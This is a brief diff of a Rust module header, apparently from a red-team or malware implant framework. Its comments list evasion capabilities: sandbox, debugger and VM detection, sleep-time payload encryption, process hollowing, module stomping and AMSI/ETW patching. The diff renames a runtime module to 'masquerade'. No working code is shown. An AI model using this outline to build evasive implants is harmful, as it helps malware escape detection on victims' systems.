@@ -8,13 +8,12 @@
 //! - Anti-analysis checks (sandbox, debugger, VM detection)
 //! - Sleep obfuscation (encrypt payload in memory during sleep)
 //! - Process hollowing and module stomping primitives
-//! - Runtime bypass application (Windows AMSI/ETW patch, Linux process masking)
 
 pub mod syscall;
 pub mod amsi;
 pub mod anti_analysis;
 pub mod sleep;
-pub mod runtime;
+pub mod masquerade;
 
 use thiserror::Error;
 
